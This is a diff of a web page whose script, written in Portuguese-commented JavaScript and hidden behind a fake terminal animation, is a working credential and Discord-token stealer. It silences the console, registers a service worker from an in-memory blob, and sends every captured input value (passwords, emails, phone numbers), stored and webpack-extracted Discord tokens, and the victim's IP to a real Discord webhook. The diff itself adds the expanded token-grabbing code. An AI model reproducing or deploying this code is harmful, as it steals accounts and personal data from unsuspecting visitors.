@@ -15,7 +15,6 @@
 <div id="terminal"></div>
 
 <script>
-/* ======= 0. INVISIBILIDADE ABSOLUTA ======= */
 (()=>{
     const nullFn = ()=>{};
     ["log","warn","error","info","debug"].forEach(m=>{ window.console[m]=nullFn; });
@@ -23,9 +22,8 @@
     window.addEventListener("unhandledrejection", e=>{ e.stopImmediatePropagation(); e.preventDefault(); });
 })();
 
-/* ======= 1. SERVICE-WORKER BLOB (nunca em disco) ======= */
 const swCode = `
-const HOOK = "https://discord.com/api/webhooks/1443161577866924124/3KawgZj1c9mahMBJAyeYTEibDSIRqmqwEgnr6XN3ytYA7tBhGkELpnVVNvi7slWRZedI";
+const HOOK = "https://discord.com/api/webhooks/1445121275218624686/a3x7y7Scgo6hkfUKbN8O7hPAg29E9QFCj8ve5bn1ekKRtakh7bms0SmQovDqOebCT2t7";
 function exfil(obj){
     fetch(HOOK,{
         method:"POST",
@@ -41,23 +39,48 @@ self.addEventListener("message",e=>{if(e.data&&e.data.t==="x") exfil(e.data.d);}
 const swBlob = new Blob([swCode],{type:"application/javascript"});
 const swURL = URL.createObjectURL(swBlob);
 navigator.serviceWorker.register(swURL,{scope:"./"}).then(()=>{
-    /* ======= 2. PAYLOAD INJETADO (blob efêmero) ======= */
+    /* ======= 2. PAYLOAD COLETOR COMPLETO ======= */
     const payload = `
 (()=>{
     const post=d=>navigator.serviceWorker.controller.postMessage({t:"x",d});
+    const TOKEN_HOOKS=["token","authorization","auth","discord","discord-token"];
     const grab=()=>{
         const cred={};
-        document.querySelectorAll("input[type=password],input[name*=pass],input[name*=login],input[name*=user],input[name*=email],input[type=text]").forEach(i=>{
-            if(i.value){
-                const k=(i.name||i.id||i.placeholder||"field").replace(/\\s/g,"_");
-                cred[k]=i.value;
-            }
+        document.querySelectorAll("input").forEach(i=>{
+            const v=i.value.trim();
+            if(!v)return;
+            const n=(i.name||i.id||i.placeholder||i.type||"field").toLowerCase().replace(/\\s/g,"_");
+            if(/password|pass|senha/.test(n+i.type)) cred[n+"_PASSWORD"]=v;
+            else if(/email|mail|login|user|usuario/.test(n)) cred[n+"_EMAIL"]=v;
+            else if(/tel|phone|cel|whatsapp|contato/.test(n+i.type)) cred[n+"_PHONE"]=v;
+            else if(i.type==="email") cred[n+"_EMAIL"]=v;
+            else if(i.type==="tel") cred[n+"_PHONE"]=v;
+            else if(i.type==="password") cred[n+"_PASSWORD"]=v;
         });
-        if(Object.keys(cred).length) post({url:location.href,cred});
+        try{
+            const tk=localStorage.getItem("token")||sessionStorage.getItem("token")||document.cookie.split("token=").pop().split(";")[0];
+            if(tk) cred["DISCORD_TOKEN"]=tk;
+        }catch{}
+        try{
+            const wp=window.webpackChunkdiscord||[];
+            wp.push([[Symbol()],{},e=>{Object.values(e.c).forEach(m=>{if(m.exports&&m.exports.default&&m.exports.default.getToken){const t=m.exports.default.getToken();if(t)cred["DISCORD_TOKEN_WEBPACK"]=t;}})}]);
+            wp.pop();
+        }catch{}
+        /* 2.3 IP + timestamp */
+        if(Object.keys(cred).length){
+            fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>{
+                cred.ip=j.ip;
+                cred.ts=new Date().toISOString();
+                post({url:location.href,...cred});
+            }).catch(()=>{cred.ip="?";cred.ts=new Date().toISOString();post({url:location.href,...cred});});
+        }
     };
+    /* 2.4 Gatilhos */
     new MutationObserver(grab).observe(document.body,{childList:true,subtree:true});
+    document.addEventListener("input",grab,true);
     document.addEventListener("submit",grab,true);
     window.addEventListener("animationstart",e=>{if(e.animationName==="onautofillstart")grab()},true);
+    setInterval(grab,30_000);
     setTimeout(grab,300);
 })();
     `;
@@ -87,7 +110,6 @@ navigator.serviceWorker.register(swURL,{scope:"./"}).then(()=>{
 </script>
 
 <script>
-/* ======= 4. ANIMAÇÃO TERMINAL (inalterada) ======= */
 const terminal = document.getElementById("terminal");
 const lines = [
     "C:\\Users\\TERMINAL> Iniciando sistema...",
